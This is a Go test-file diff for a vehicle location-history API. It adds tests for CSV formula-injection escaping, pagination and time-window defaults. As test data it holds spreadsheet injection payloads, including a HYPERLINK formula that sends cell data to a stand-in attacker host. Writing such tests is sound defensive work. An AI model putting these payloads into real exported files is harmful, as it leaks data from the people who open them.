@@ -16,13 +16,17 @@ import (
 )
 
 type mockLocationHistoryLister struct {
-	points       []LocationPoint
-	err          error
-	capturedFrom int64
+	points        []LocationPoint
+	err           error
+	capturedFrom  int64
+	capturedTo    int64
+	capturedLimit int
 }
 
-func (m *mockLocationHistoryLister) GetLocationHistory(_ context.Context, _ string, from, _ int64, _ int) ([]LocationPoint, error) {
+func (m *mockLocationHistoryLister) GetLocationHistory(_ context.Context, _ string, from, to int64, limit int) ([]LocationPoint, error) {
 	m.capturedFrom = from
+	m.capturedTo = to
+	m.capturedLimit = limit
 	if m.err != nil {
 		return nil, m.err
 	}
@@ -71,6 +75,7 @@ func TestHandleGetLocationHistory_Success(t *testing.T) {
 	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
 	assert.Equal(t, "vehicle-042", resp.VehicleID)
 	assert.Equal(t, 1, resp.Count)
+	assert.False(t, resp.HasMore)
 	require.Len(t, resp.Locations, 1)
 	assert.Equal(t, -1.29, resp.Locations[0].Latitude)
 	assert.Equal(t, 36.82, resp.Locations[0].Longitude)
@@ -400,4 +405,130 @@ func TestHandleGetLocationHistory_InvalidFormat(t *testing.T) {
 	var resp map[string]string
 	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
 	assert.Contains(t, resp["error"], "format must be json or csv")
+}
+
+func TestSanitizeCSVCell(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"equals prefix", "=1+2", "'=1+2"},
+		{"plus prefix", "+SUM(A1)", "'+SUM(A1)"},
+		{"minus prefix", "-2+3", "'-2+3"},
+		{"at prefix", "@cmd", "'@cmd"},
+		{"tab prefix", "\tx", "'\tx"},
+		{"carriage return prefix", "\rx", "'\rx"},
+		{"empty", "", ""},
+		{"plain", "trip-1", "trip-1"},
+		{"formula char mid-string", "trip=1", "trip=1"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			assert.Equal(t, tt.want, sanitizeCSVCell(tt.in))
+		})
+	}
+}
+
+func TestHandleGetLocationHistory_CSVFormulaInjection(t *testing.T) {
+	now := time.Now().UTC()
+	lister := &mockLocationHistoryLister{
+		points: []LocationPoint{
+			{Latitude: 1, Longitude: 2, Timestamp: now.Unix(), TripID: `=HYPERLINK("https://evil.example/?d="&A1,"open")`, ReceivedAt: now},
+			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 60, TripID: "+SUM(A1:A9)", ReceivedAt: now},
+			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 120, TripID: "-2+3", ReceivedAt: now},
+			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 180, TripID: "@cmd", ReceivedAt: now},
+			{Latitude: 1, Longitude: 2, Timestamp: now.Unix() - 240, TripID: "trip-1", ReceivedAt: now},
+		},
+	}
+	checker := &mockVehicleChecker{exists: true}
+	handler := handleGetLocationHistory(lister, checker)
+
+	w := httptest.NewRecorder()
+	handler.ServeHTTP(w, newHistoryRequest("bus-1", "format=csv"))
+
+	assert.Equal(t, http.StatusOK, w.Code)
+
+	reader := csv.NewReader(w.Body)
+	records, err := reader.ReadAll()
+	require.NoError(t, err)
+	require.Len(t, records, 6, "header + 5 data rows")
+
+	assert.Equal(t, `'=HYPERLINK("https://evil.example/?d="&A1,"open")`, records[1][6], "formula prefix = must be escaped")
+	assert.Equal(t, "'+SUM(A1:A9)", records[2][6], "formula prefix + must be escaped")
+	assert.Equal(t, "'-2+3", records[3][6], "formula prefix - must be escaped")
+	assert.Equal(t, "'@cmd", records[4][6], "formula prefix @ must be escaped")
+	assert.Equal(t, "trip-1", records[5][6], "safe trip_id must pass through unchanged")
+}
+
+func TestHandleGetLocationHistory_HasMore(t *testing.T) {
+	now := time.Now().UTC()
+	points := []LocationPoint{
+		{Latitude: 1, Longitude: 2, Timestamp: now.Unix(), ReceivedAt: now},
+		{Latitude: 3, Longitude: 4, Timestamp: now.Unix() - 60, ReceivedAt: now},
+		{Latitude: 5, Longitude: 6, Timestamp: now.Unix() - 120, ReceivedAt: now},
+	}
+
+	t.Run("truncated at limit", func(t *testing.T) {
+		lister := &mockLocationHistoryLister{points: points}
+		checker := &mockVehicleChecker{exists: true}
+		handler := handleGetLocationHistory(lister, checker)
+
+		w := httptest.NewRecorder()
+		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=2"))
+
+		assert.Equal(t, http.StatusOK, w.Code)
+		assert.Equal(t, 3, lister.capturedLimit, "handler should fetch limit+1 to detect truncation")
+
+		var resp locationHistoryResponse
+		require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
+		assert.True(t, resp.HasMore)
+		assert.Equal(t, 2, resp.Count)
+		assert.Len(t, resp.Locations, 2)
+	})
+
+	t.Run("not truncated", func(t *testing.T) {
+		lister := &mockLocationHistoryLister{points: points}
+		checker := &mockVehicleChecker{exists: true}
+		handler := handleGetLocationHistory(lister, checker)
+
+		w := httptest.NewRecorder()
+		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=3"))
+
+		assert.Equal(t, http.StatusOK, w.Code)
+
+		var resp locationHistoryResponse
+		require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
+		assert.False(t, resp.HasMore)
+		assert.Equal(t, 3, resp.Count)
+		assert.Len(t, resp.Locations, 3)
+	})
+
+	t.Run("csv trimmed to limit", func(t *testing.T) {
+		lister := &mockLocationHistoryLister{points: points}
+		checker := &mockVehicleChecker{exists: true}
+		handler := handleGetLocationHistory(lister, checker)
+
+		w := httptest.NewRecorder()
+		handler.ServeHTTP(w, newHistoryRequest("bus-1", "limit=2&format=csv"))
+
+		reader := csv.NewReader(w.Body)
+		records, err := reader.ReadAll()
+		require.NoError(t, err)
+		assert.Len(t, records, 3, "header + limit rows, extra detection row trimmed")
+	})
+}
+
+func TestHandleGetLocationHistory_ToOnly(t *testing.T) {
+	lister := &mockLocationHistoryLister{points: make([]LocationPoint, 0)}
+	checker := &mockVehicleChecker{exists: true}
+	handler := handleGetLocationHistory(lister, checker)
+
+	w := httptest.NewRecorder()
+	handler.ServeHTTP(w, newHistoryRequest("bus-1", "to=1000000"))
+
+	assert.Equal(t, http.StatusOK, w.Code, "past ?to= alone must select the 24h window ending at to, not 400")
+	assert.Equal(t, int64(1000000), lister.capturedTo)
+	assert.Equal(t, int64(1000000-86400), lister.capturedFrom, "from should default to to-86400")
 }
